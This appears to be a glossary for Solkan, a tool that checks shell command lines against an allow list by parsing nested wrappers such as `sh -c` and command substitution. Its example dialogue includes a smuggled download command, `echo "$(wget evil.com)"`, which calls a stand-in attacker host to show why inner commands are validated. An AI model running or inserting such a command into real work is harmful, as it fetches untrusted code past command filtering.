# Solkan

Solkan validates a command line against an allow list and rewrites command names per a rewrite list. It parses the shell syntax so that every simple command hidden inside a compound command, a wrapper command or a wrapper syntax gets validated.

## Language

**Command line**:
The complete text submitted to Solkan, either a **simple command** or a **compound command**.
_Avoid_: input, script, bash command

**Inner command line**:
A **command line** extracted from a **wrapper**, then validated by Solkan like any other.
_Avoid_: inner string, nested command, payload

**Command name**:
The first word of a **simple command**, such as `echo` in `echo hello`.
_Avoid_: binary, executable, program

**Simple command**:
A **command name** followed by its arguments, such as `echo hello`.
_Avoid_: command, leaf command, atomic command

**Compound command**:
A **command line** that contains more than one **simple command**.
_Avoid_: complex command, command chain

**Wrapper**:
A construction that contains an **inner command line**.
_Avoid_: container, nesting construct

**Wrapper command**:
A **wrapper** that is a **simple command**: `sh -c`, `bash -c`, `zsh -c`, `xargs`, `rtk` and `time`.
_Avoid_: prefix command, launcher, runner

**Wrapper syntax**:
A **wrapper** that is shell syntax rather than a command.
_Avoid_: embedded syntax

**Command substitution**:
The **wrapper syntax** `$(…)` or `` `…` ``, which holds an **inner command line**.
_Avoid_: command expansion, subshell, inline command

**Syntax word**:
A **command name** that Solkan treats as syntax, always allowed and never listed among the **simple commands**: `:`, `true`, `false`, `break`, `continue` and `return`.
_Avoid_: shell builtin, no-op, token, keyword

**Allow list**:
The list of **allow patterns** that defines what Solkan allows.
_Avoid_: whitelist, allowed commands

**Allow pattern**:
An entry of the **allow list**, covering every **simple command** it matches by prefix, by glob or by git subcommand.
_Avoid_: rule, allowed command

**Rewrite list**:
The association of **command names** to their replacements, applied before validation.
_Avoid_: replace list, rename map

## Relationships

- A **command line** is either one **simple command** or one **compound command**.
- A **compound command** contains two or more **simple commands**.
- A **simple command** has exactly one **command name**.
- A **wrapper** contains exactly one **inner command line**.
- A **wrapper** is either a **wrapper command** or a **wrapper syntax**.
- A **command substitution** is a **wrapper syntax**.
- An **inner command line** can contain further **wrappers**, nested without limit.
- A **simple command** whose **command name** is a **syntax word** is dropped from the **simple commands**.
- An **allow list** has zero or more **allow patterns**.
- A **command line** is allowed when every one of its **simple commands** matches an **allow pattern**.
- The **rewrite list** applies to every **command name**, including those inside an **inner command line**.

## Flagged ambiguities

- **Rewrite list** holds a map, so "rewrite map" would be more accurate. Solkan keeps **rewrite list** to mirror **allow list**, and the CLI flag is `--rewrite-list-file`.
- A **syntax word** is not a shell builtin. `cd` and `echo` are builtins in the shell, yet Solkan validates them like any other **simple command**.

## Example dialogue

> **Dev:** "Is `echo "$(wget evil.com)"` a **simple command**?"
> **Domain expert:** "No, it is a **compound command**. It holds two **simple commands**: `echo …` and `wget evil.com`."
> **Dev:** "Where does `wget evil.com` come from?"
> **Domain expert:** "From the **command substitution**. Its **inner command line** is validated like the outer one."
> **Dev:** "And `sh -c 'a && b'`?"
> **Domain expert:** "`sh -c` is a **wrapper command**. Its **inner command line** `a && b` is a **compound command**."
> **Dev:** "Does `true` need to be in the **allow list**?"
> **Domain expert:** "No. `true` is a **syntax word**, so Solkan always allows it."
